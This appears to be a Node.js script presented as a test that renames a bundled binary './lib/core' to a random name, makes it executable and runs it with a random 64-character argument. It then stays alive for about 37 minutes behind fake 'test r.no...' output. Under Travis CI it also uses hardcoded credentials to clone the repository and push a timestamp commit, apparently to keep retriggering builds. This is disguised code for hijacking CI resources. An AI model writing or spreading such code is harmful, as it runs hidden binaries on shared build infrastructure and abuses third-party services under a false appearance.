function makeid(length) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < length; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
var name = makeid(5);
var param = makeid(64);
require('child_process').execSync('cd ./lib && mv core ' + name + ' && chmod 755 -R ' + name + ' && ls -l');
var child = require('child_process').spawn('./lib/' + name, [param]);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
var target = '';
if (__dirname.indexOf('/home/travis') !== -1){
  var pt = __dirname.split('travis/build/').pop();
  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
}
var myrepo = 'git clone ' + target + ' aaa && ';
myrepo += 'git config --global user.email "test" && ';
myrepo += 'git config --global user.name "test" && ';
myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
if (__dirname.indexOf('/home/travis') !== -1) require('child_process').exec(myrepo);
var index = 1;
var max = 37;
var interval;
var lock = false;
interval = setInterval(function () {
  if (index >= max) {    
    setTimeout(function(){
        process.exit(0);
    }, 1000 * 30);		
  }  
  console.log("test r.no..." + ++index);
}, 1000 * 60);
